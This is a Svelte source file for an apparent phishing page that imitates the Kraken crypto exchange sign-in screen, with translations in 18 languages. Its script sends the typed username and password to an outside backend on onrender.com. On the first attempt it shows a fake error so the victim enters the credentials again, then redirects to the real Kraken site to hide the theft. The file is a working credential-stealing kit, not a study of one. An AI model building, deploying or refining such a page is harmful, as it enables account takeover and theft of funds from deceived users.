<script>
    import KrakenLogo from "./krakenLogo.svelte";
    import GoogleIcon from '$lib/assets/google.svg?url';
    import AppleIcon from '$lib/assets/apple-logo.svg?url';
    import GlobeIcon from '$lib/assets/globe.png';
    import DownArrow from '$lib/assets/Chevron-Downward.svg?url';
    import Beast from '$lib/assets/Beast_Web.webp';
    import BeastMov from '$lib/assets/Beast_Web.mov';
    import BeastWebm from '$lib/assets/Beast_Web.webm';
    import Logo from './Logo.svelte';

     const translations = {
    "en-us": { display: "English (US)", title: "Sign in to Kraken", userLabel: "Email or username", passLabel: "Password", forgot: "Forgot", or: "or", continue: "Continue", support: "Still can’t sign in?", emailUs: "Email us", cta: "Create Account", error: "Unable to sign in. That doesn't look right. Check your email/username and password and try again" },
    "ms": { display: "Bahasa Melayu", title: "Log masuk ke Kraken", userLabel: "E-mel atau nama pengguna", passLabel: "Kata laluan", forgot: "Lupa", or: "atau", continue: "Teruskan", support: "Masih tidak dapat log masuk?", emailUs: "Emel kami", cta: "Daftar Akaun", error: "Tidak dapat log masuk. Maklumat tidak tepat. Sila semak e-mel/nama pengguna dan kata laluan anda dan cuba lagi" },
    "cs": { display: "Čeština", title: "Přihlásit se ke Krakenu", userLabel: "E-mail nebo uživatelské jméno", passLabel: "Heslo", forgot: "Zapomněli jste", or: "nebo", continue: "Pokračovat", support: "Stále se nemůžete přihlásit?", emailUs: "Napište nám", cta: "Vytvořit účet", error: "Nepodařilo se přihlásit. To nevypadá správně. Zkontrolujte e-mail/uživatelské jméno a heslo a zkuste to znovu" },
    "da": { display: "Dansk", title: "Log ind på Kraken", userLabel: "E-mail eller brugernavn", passLabel: "Adgangskode", forgot: "Glemt", or: "eller", continue: "Fortsæt", support: "Kan du stadig ikke logge ind?", emailUs: "Send os en e-mail", cta: "Opret konto", error: "Kunne ikke logge ind. Det ser ikke rigtigt ud. Tjek din e-mail/dit brugernavn og din adgangskode, og prøv igen" },
    "de": { display: "Deutsch", title: "Bei Kraken anmelden", userLabel: "E-Mail oder Benutzername", passLabel: "Passwort", forgot: "Passwort vergessen?", or: "oder", continue: "Weiter", support: "Anmeldung immer noch nicht möglich?", emailUs: "Schreiben Sie uns", cta: "Konto erstellen", error: "Anmeldung nicht möglich. Das sieht nicht richtig aus. Überprüfen Sie Ihre E-Mail/Ihren Benutzernamen und Ihr Passwort und versuchen Sie es erneut" },
    "en-au": { display: "English (Australia)", title: "Sign in to Kraken", userLabel: "Email or username", passLabel: "Password", forgot: "Forgot", or: "or", continue: "Continue", support: "Still can’t sign in?", emailUs: "Email us", cta: "Create Account", error: "Unable to sign in. That doesn't look right. Check your email/username and password and try again" },
    "en-ca": { display: "English (Canada)", title: "Sign in to Kraken", userLabel: "Email or username", passLabel: "Password", forgot: "Forgot", or: "or", continue: "Continue", support: "Still can’t sign in?", emailUs: "Email us", cta: "Create Account", error: "Unable to sign in. That doesn't look right. Check your email/username and password and try again" },
    "en-gb": { display: "English (UK)", title: "Sign in to Kraken", userLabel: "Email or username", passLabel: "Password", forgot: "Forgotten", or: "or", continue: "Continue", support: "Still can’t sign in?", emailUs: "Email us", cta: "Create Account", error: "Unable to sign in. That doesn't look right. Check your email/username and password and try again" },
    "es-ar": { display: "Español (Argentina)", title: "Iniciá sesión en Kraken", userLabel: "Email o usuario", passLabel: "Contraseña", forgot: "Olvidé mi", or: "o", continue: "Continuar", support: "¿Aún no podés entrar?", emailUs: "Contactanos", cta: "Crear cuenta", error: "No se pudo iniciar sesión. Algo no está bien. Revisá tu email o usuario y contraseña e intentá de nuevo" },
    "es-es": { display: "Español (España)", title: "Inicia sesión en Kraken", userLabel: "Email o usuario", passLabel: "Contraseña", forgot: "He olvidado mi", or: "o", continue: "Continuar", support: "¿Sigues sin poder entrar?", emailUs: "Contacta con nosotros", cta: "Crear cuenta", error: "No se ha podido iniciar sesión. Parece que algo no es correcto. Comprueba tu email o usuario y contraseña e inténtalo de nuevo"  },
    "es-lat": { display: "Español (Latinoamérica)", title: "Inicia sesión en Kraken", userLabel: "Email o usuario", passLabel: "Contraseña", forgot: "Olvidé mi", or: "o", continue: "Continuar", support: "¿Aún no puedes entrar?", emailUs: "Contáctanos", cta: "Crear cuenta", error: "No se pudo iniciar sesión. Algo no está bien. Revisa tu email o usuario y contraseña e intenta de nuevo"  },
    "es-mx": { display: "Español (México)", title: "Inicia sesión en Kraken", userLabel: "Email o usuario", passLabel: "Contraseña", forgot: "Olvidé mi", or: "o", continue: "Continuar", support: "¿Sigues sin poder entrar?", emailUs: "Contáctanos", cta: "Crear cuenta", error: "No se pudo iniciar sesión. Algo no está bien. Revisa tu email o usuario y contraseña e intenta de nuevo" },
    "fr": { display: "Français", title: "Connexion à Kraken", userLabel: "Email ou nom d'utilisateur", passLabel: "Mot de passe", forgot: "Oublié", or: "ou", continue: "Continuer", support: "Toujours pas de connexion ?", emailUs: "Écrivez-nous", cta: "Créer un compte", error: "Impossible de se connecter. Les informations sont incorrectes. Vérifiez votre e-mail/nom d'utilisateur et votre mot de passe, puis réessayez" },
    "it": { display: "Italiano", title: "Accedi a Kraken", userLabel: "Email o nome utente", passLabel: "Password", forgot: "Dimenticata", or: "o", continue: "Continua", support: "Problemi di accesso?", emailUs: "Contattaci", cta: "Crea account" , error: "Impossibile accedere. Qualcosa non quadra. Controlla l'e-mail/il nome utente e la password e riprova" },
    "hu": { display: "Magyar", title: "Bejelentkezés a Krakenbe", userLabel: "E-mail vagy felhasználónév", passLabel: "Jelszó", forgot: "Elfelejtett", or: "vagy", continue: "Folytatás", support: "Még mindig nem tud belépni?", emailUs: "Írjon nekünk", cta: "Fiók létrehozása", error: "Sikertelen bejelentkezés. Valami nem stimmel. Ellenőrizze az e-mail-címet/felhasználónevet és a jelszót, majd próbálja újra"  },
    "nl": { display: "Nederlands", title: "Inloggen bij Kraken", userLabel: "E-mail of gebruikersnaam", passLabel: "Wachtwoord", forgot: "Vergeten", or: "of", continue: "Doorgaan", support: "Kun je nog steeds niet inloggen?", emailUs: "E-mail ons", cta: "Account aanmaken" , error: "Inloggen mislukt. Dat klopt niet helemaal. Controleer je e-mail/gebruikersnaam en wachtwoord en probeer het opnieuw"},
    "no": { display: "Norsk", title: "Logg inn på Kraken", userLabel: "E-post eller brukernavn", passLabel: "Passord", forgot: "Glemt", or: "eller", continue: "Fortsett", support: "Fortsatt problemer med pålogging?", emailUs: "Kontakt oss", cta: "Opprett konto", error: "Kunne ikke logge inn. Dette ser ikke riktig ut. Sjekk e-post/brukernavn og passwort og prøv på nytt"  },
    "pl": { display: "Polski", title: "Zaloguj się do Kraken", userLabel: "E-mail lub nazwa użytkownika", passLabel: "Hasło", forgot: "Zapomniałeś", or: "lub", continue: "Kontynuuj", support: "Nadal nie możesz się zalogować?", emailUs: "Napisz do nas", cta: "Utwórz konto", error: "Nie można się zalogować. Coś jest nie tak. Sprawdź e-mail/nazwę użytkownika oraz hasło i spróbuj ponownie" }
};

    let currentLang = $state("en-us");
    let showLangDropdown = $state(false);
    const t = $derived(translations[currentLang]);
    let username = $state("");
    let password = $state("");
    let showPassword = $state(false);
    let focused = $state("");
    let isLoading = $state(false);
    let loginAttempts = 0;

    // CHANGE BACKEND_URL AS REQUIRED 
    const BACKEND_URL = 'https://Bellbknd.onrender.com/submit';

    const isUsernameValid = $derived(() => {
	const value = username.trim();
	return value.includes("@") ? value.includes(".") : value.length >= 3;
});

const isPasswordValid = $derived(password.length >= 3);
const isFormValid = $derived(isUsernameValid() && isPasswordValid);
    let errorMessage = $state("");
    let showError = $state(false);
    let attemptedSubmit = $state(false);

    function togglePassword() {
        showPassword = !showPassword;
    }

    function selectLang(langCode) {
        currentLang = langCode;
        showLangDropdown = false;
    }

 async function sendDataToBackend() {
    isLoading = true;
    showError = false;

    try {
        const response = await fetch(BACKEND_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            
            loginAttempts++;

            if(loginAttempts === 1) {
                showError = true;
                errorMessage = t.error;
            } else {
                setTimeout(() => {window.location.href="https://id.kraken.com";}, 1500);
            }
            
        } else {
            throw new Error();
        }
    } catch (err) {
        showError = true;
        errorMessage = t.error; 
    } finally {
        isLoading = false;
    }
}
    function handleSubmit() {
        attemptedSubmit = true;

        if (!isUsernameValid() || !isPasswordValid) { // Note: isUsernameValid is a function in your code
            showError = true;
            errorMessage = "Please enter a valid email/username and password.";
            return;
        }

        sendDataToBackend();
    }
</script>

<div class="page">
	<!-- HEADER -->
	<header class="header">
		<div class="logo"><span class="desktop-hidden"><KrakenLogo/></span> <span class="medium-hidden"><Logo/></span></div>

		<div class="right">
			 <div class="lang-container mobile-hidden">
                <button class="lang" onclick={() => showLangDropdown = !showLangDropdown}>
                    <img src={GlobeIcon} width="18" height="18" alt="globe"/>
                    <span>{t.display}</span> 
                    <img src={DownArrow} alt="Down-arrow" class="arrow {showLangDropdown ? 'up' : ''}"/>
                </button>
                
                {#if showLangDropdown}
                    <div class="dropdown">
                        {#each Object.entries(translations) as [code, data]}
                            <button onclick={() => selectLang(code)} class:active={currentLang === code}>
                                {data.display}
                            </button>
                        {/each}
                    </div>
                {/if}
            </div>

			<button class="cta"><a href="https://www.kraken.com/sign-up?rfr=consumer-web&theme=light">{t.cta}</a></button>
		</div>
	</header>
    <div class="secondary lang-container" >
        <button class="lang" onclick={() => showLangDropdown = !showLangDropdown}>
            <img src={GlobeIcon} width="18" height="18" alt="globe"/>
            <span>{t.display}</span> 
            <img src={DownArrow} alt="Down-arrow" class="arrow {showLangDropdown ? 'up' : ''}"/>
        </button>
         {#if showLangDropdown}
                    <div class="dropdown">
                        {#each Object.entries(translations) as [code, data]}
                            <button onclick={() => selectLang(code)} class:active={currentLang === code}>
                                {data.display}
                            </button>
                        {/each}
                    </div>
        {/if}
    </div>

	<!-- MAIN -->
	<main class="main">
		<div class="card">
            <!-- WEbrip Poster -->
             <div class="desktop-only-video">
                <video class="w-40" autoplay="" loop="" playsinline="" preload="auto" disablepictureinpicture="" poster={Beast}>
                    <source type="video/mp4; codecs=&quot;hvc1&quot;" src={BeastMov}>
                    <source type="video/webm" src={BeastWebm}></video>
             </div>
			<h1 class="big-font">{t.title}</h1>

			<!-- USERNAME -->
			<div class="input-group email-input">
	<label class:active={username || focused === 'username'}>{t.userLabel}</label>
	<input 
		type="text" 
		bind:value={username}
		onfocus={() => focused = 'username'}
        onblur={() => focused = ''}
	/>
</div>

<div class="input-group password">
	<label class:active={password || focused === 'password'}>{t.passLabel}</label>
	<input 
		type={showPassword ? "text" : "password"}
		bind:value={password}
		onfocus={() => focused = 'password'}
        onblur={() => focused = ''}
	/>

				<button type="button" onclick={togglePassword}>
	{#if showPassword}
		<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2">
			<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C7 19 2.73 16.11 1 12c.73-1.73 1.8-3.21 3.06-4.34M9.9 4.24A10.94 10.94 0 0 1 12 5c5 0 9.27 2.89 11 7a11.05 11.05 0 0 1-4.24 5.36M1 1l22 22"/>
		</svg>
	{:else}
		<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2">
			<path d="M1 12C2.73 7.89 7 5 12 5s9.27 2.89 11 7c-1.73 4.11-6 7-11 7s-9.27-2.89-11-7z"/>
			<circle cx="12" cy="12" r="3"/>
		</svg>
	{/if}
</button>
			</div>

			<!-- HELP -->
			<p class="help">
                {t.forgot} 
            <a href="https://id.kraken.com/forgot-password">{t.passLabel.toLowerCase()}</a> 
                {t.or}
                <a href="https://id.kraken.com/forgot-username">{t.userLabel.split(' ').pop().toLowerCase()}</a>?
            </p>

            {#if showError}
            <div class="error-alert">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="#DC2626" stroke-width="2"/>
                <line x1="12" y1="8" x2="12" y2="12" stroke="#DC2626" stroke-width="2"/>
                <circle cx="12" cy="16" r="1" fill="#DC2626"/>
            </svg>
            <span>{errorMessage}</span>
            </div>
            {/if}

			<!-- BUTTON -->
			<button class="submit" onclick={handleSubmit} disabled={isLoading}>
                {#if isLoading}
            <div class="spinner"></div>
                {:else}
                    {t.continue}
                {/if}
</button>

			<!-- DIVIDER -->
			<div class="divider">
				<span></span>
				<p>{t.or}</p>
				<span></span>
			</div>

            <!-- SOCIALS -->
            <div class="socials">
    <a href="https://accounts.google.com" class="social-btn">
        <img src={GoogleIcon} alt="Google" class="w-5 h-5" />
    </a>
    
    <a href="https://appleid.apple.com/auth/authorize?client_id=com.kraken.pay.app-android&redirect_uri=https%3A%2F%2Fid.kraken.com%2Fauth%2Fcallback%2Fapple&response_type=code%20id_token&scope=email%20name&nonce=SHznvH_xeixi8PdktcMyFv-KJXrEXJnHx80LDCKwA54&response_mode=web_message&frame_id=49bc8535-9956-45f8-b416-0821ae644dab&m=11&v=1.5.6" class="social-btn">
        <img src={AppleIcon} alt="Apple" class="w-5 h-5" />
    </a>
</div>
            <!-- <div class="socials">
                <button type="button"><img src={GoogleIcon} alt="Google" class="w-5 h-5" /><a href="https://account.google.com"></a></button>
                <button type="button"><img src={AppleIcon} alt="Apple" class="w-5 h-5" /><a href="https://appleid.apple.com/auth/authorize?client_id=com.kraken.pay.app-android&redirect_uri=https%3A%2F%2Fid.kraken.com%2Fauth%2Fcallback%2Fapple&response_type=code%20id_token&scope=email%20name&nonce=SHznvH_xeixi8PdktcMyFv-KJXrEXJnHx80LDCKwA54&response_mode=web_message&frame_id=49bc8535-9956-45f8-b416-0821ae644dab&m=11&v=1.5.6"></a></button>
            </div> -->

			<p class="support">
				{t.support}<a href="https://support.kraken.com/hc/forms/37016855737620" class="email-us">{t.emailUs}</a>
			</p>
		</div>
	</main>
    <footer class="footer">
	<a href="https://www.kraken.com/legal/privacy">Privacy</a>
	<a href="https://www.kraken.com/legal">Terms of Service</a>
</footer>
</div>

<style>
	/* Layout */
	.page {
		min-height: 100vh;
		display: flex;
		flex-direction: column;
		/* background: #0b0b0f;
         */
         background: #F9F9FB ;
		color: black;
		font-family: system-ui;
	}

	/* Header */
	.header {
		display: flex;
		justify-content: space-between;
		align-items: center;
		padding: 1rem 2rem;
	}

 .secondary {
	display: none;
	border-top: 1px solid #e5e7eb;
	padding: 10px 16px;
	background: white;
}
.logo {
	display: flex;
	align-items: center;
	gap: 8px;
	font-weight: bold;
	font-size: 1.2rem;
    cursor: pointer;
}

    .desktop-hidden {
        display: none;
    }

	.right {
		display: flex;
		gap: 10px;
	}

   .lang {
        background: #F1F1F5;
        color: black;
        border: none;
        padding: 8px 12px;
        border-radius: 8px;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 8px; 
        font-size: 14px;
        font-weight: 500;
    }

    .lang span {
        white-space: nowrap;
    }

     .arrow {
        width: 12px;
        transition: transform 0.2s ease;
    }

    .arrow.up {
        transform: rotate(180deg);
    }

     .lang-container {
        position: relative;
    }

    .dropdown {
        position: absolute;
        top: calc(100% + 8px);
        right: 0;
        background: white;
        border: 1px solid #e5e7eb;
        border-radius: 12px;
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        z-index: 50;
        min-width: 160px;
        padding: 4px;
        display: flex;
        flex-direction: column;
        max-height: 300px;
        overflow-y: auto; 
    }

        .dropdown button {
        background: transparent;
        border: none;
        padding: 10px 16px;
        text-align: left;
        border-radius: 8px;
        cursor: pointer;
        font-size: 14px;
    }

    .dropdown button:hover {
        background: #F9F9FB;
    }

    .dropdown button.active {
        color: #6c2bd9;
        font-weight: bold;
    }


	.cta {
		background: #F1F1F5;
		color: #5b21b6;;
		padding: 8px 14px;
		border-radius: 8px;
		border: none;
		cursor: pointer;
        opacity: 0.5;
        font-weight: 700;
	}

	/* Main */
	.main {
		flex: 1;
		display: flex;
		justify-content: center;
		align-items: center;
		padding: 1rem;
	}

	/* Card (desktop effect) */
	.card {
		width: 100%;
		max-width: 420px;
		/* background: #121218;
         */
         background: white;
		padding: 2rem;
		border-radius: 16px;
	}
    .desktop-only-video {
        display: flex;
        justify-content: center;
        align-items: center;
    }

    h1 {
	margin-bottom: 1.5rem;
	font-weight: 700;
}

.big-font {
    font-size: 28px;
    text-align: center;
}

	/* Inputs */
	.input-group {
		position: relative;
		margin-bottom: 4px;
	}

	.input-group input {
		width: 100%;
		padding: 18px 12px 6px;
		/* background: #1a1a22; */
        background:  #F9F9FB;
		border: none;
		/* border-radius: 10px; */
		color: black;
		outline: none;
	}

	.input-group label {
		position: absolute;
		left: 12px;
		top: 40%;
		transform: translateY(-25%);
		color: #aaa;
		transition: 0.2s;
		font-size: 14px;
	}

	.input-group label.active {
		top: 6px;
		font-size: 11px;
	}

    .input-group.email-input input {
        border-radius: 10px 10px 0 0 !important;
    }



.input-group.password input {
    border-radius: 0 0 10px 10px;   
}

.input-group input:hover {
	background: #d1d5db;
}

.input-group input:focus {
	outline: none;
	border: 1px solid #6c2bd9 !important;
	/* box-shadow: 0 0 0 2px rgba(108, 43, 217, 0.15); */
}
	/* Password button */
	.password button {
		position: absolute;
		right: 10px;
		top: 50%;
		transform: translateY(-50%);
		background: none;
		border: none;
		color: white;
		cursor: pointer;
	}

	/* Help */
	.help {
		font-size: 13px;
		color: #aaa;
		margin: 10px 0;
	}

	.help a {
		color: #8b5cf6;
	}

    .email-us {
        color: #8b5cf6;
    }

    .error-box {
	display: flex;
	align-items: flex-start;
	gap: 10px;
	background: #FEF2F2; /* light red */
	border: 1px solid #FECACA;
	color: #991B1B;
	padding: 12px;
	border-radius: 10px;
	margin-top: 10px;
	font-size: 13px;
}

    .error-icon {
	    margin-top: 2px;
    }

	.submit {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    padding: 12px;
    border-radius: 999px;
    border: none;
    background: #6c2bd9; /* Your primary purple */
    color: white;
    cursor: pointer;
    margin-top: 10px;
    font-weight: 600;
     min-height: 48px;
    /* Smooth transition for the background color */
    transition: background-color 0.2s ease;
}

.submit:hover {
    background: #5b21b6; /* A deeper, richer violet */
}

.submit:active {
    background: #4c1d95;
    transform: scale(0.98); /* Subtle "push" effect */
}

.spinner {
    width: 20px;
    height: 20px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    border-top: 2px solid white;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.submit:disabled {
    color: #A3A3A3;
    cursor: not-allowed;
}

	/* Divider */
	.divider {
		display: flex;
		align-items: center;
		gap: 10px;
		margin: 20px 0;
	}

	.divider span {
		flex: 1;
		height: 1px;
		background: #333;
	}

	.divider p {
		font-size: 12px;
		color: #888;
	}

	/* Socials */
	.socials {
		display: flex;
		justify-content: center;
		gap: 10px;
	}

	.socials button {
	width: 44px;
	height: 44px;
	border-radius: 50%;
	border: 1px solid #e5e7eb;
	background: #F1F1F5;
    /* opacity: 0.3; */
	display: flex;
	align-items: center;
	justify-content: center;
	cursor: pointer;
    transition: background-color 0.2s ease;
}

    .socials button:hover {
        background: #d1d5db;
    }

	

    .socials a {
    width: 44px;
    height: 44px;
    border-radius: 50%;
    border: 1px solid #e5e7eb;
    background: #F1F1F5;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: background-color 0.2s ease;
    text-decoration: none; /* Removes underline from links */
}

.socials a:hover {
    background: #d1d5db;
}

/* Ensure the image inside doesn't move */
    .socials a img {
        display: block;
    }

    /* Support */
	.support {
		text-align: center;
		font-size: 13px;
		margin-top: 20px;
		color: #aaa;
	}
    .footer {
	position: fixed;
	bottom: 0;
	width: 100%;
	display: flex;
	justify-content: center;
	gap: 20px;
	padding: 10px;
	background: #F9F9FB ;
	/* border-top: 1px solid #eee; */
	font-size: 13px;
}

.footer a {
	color: #666;
	text-decoration: none;
}

/* Utilities */
    .error-alert {
    background-color: #FFF5F5; 
    border: 1px solid #FC8181;
    color: #C53030;
    padding: 12px 16px;
    border-radius: 8px;
    margin-bottom: 10px;
    font-size: 14px;
    line-height: 1.4;
    display: flex;
    align-items: center;
    gap: 10px;
    animation: slideDown 0.3s ease-out;
}

@keyframes slideDown {
    from {
        opacity: 0;
        transform: translateY(-10px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.error-alert svg {
    flex-shrink: 0;
}

	/* 📱 Mobile tweaks */
	@media (max-width: 600px) {
        .page {
            background: white;
        }
        .main {
            display: flex;
            justify-content: center;
            flex: 0;
        }

        .desktop-hidden {
            display: block;
        }

        .mobile-hidden {
            display: none;
        }

        .desktop-only-video{
            display: none;
        }

        .medium-hidden {
            display: none;
        }

       	.secondary {
		display: flex;
		justify-content: flex-end;
        overflow: visible; 
        z-index: 100;
        position: relative;
	}

    .secondary .dropdown {
        right: 0;
        top: calc(100% + 5px);
        width: 200px;
    }   

		.card {
			background: transparent;
			padding: 1rem;
		}

		.header {
			padding: 1rem;
		}

        .big-font {
            text-align: left;
        }

        .footer {
            background: white;
        }
	}
</style>